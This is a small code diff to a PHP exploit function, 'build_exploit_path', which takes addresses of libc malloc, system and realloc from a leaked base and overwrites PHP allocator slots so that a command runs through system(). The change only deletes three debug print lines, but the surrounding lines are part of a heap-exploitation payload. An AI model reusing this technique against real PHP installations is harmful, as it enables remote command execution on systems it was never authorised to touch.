@@ -450,9 +450,6 @@ function build_exploit_path($libc, $libc_base, $heap, $command, $sleep =1 ,$padd
     $ADDR_EMALLOC = $libc -> shared_librarys['malloc'] + $libc_base;
     $ADDR_EFREE = $libc -> shared_librarys['system'] + $libc_base;
     $ADDR_EREALLOC = $libc -> shared_librarys['realloc'] + $libc_base;
-    echo $ADDR_EMALLOC."\n";
-    echo $ADDR_EFREE."\n";
-    echo $ADDR_EREALLOC."\n";
     
     $ADDR_HEAP = $heap;
     $ADDR_FREE_SLOT = $ADDR_HEAP + 0x20;
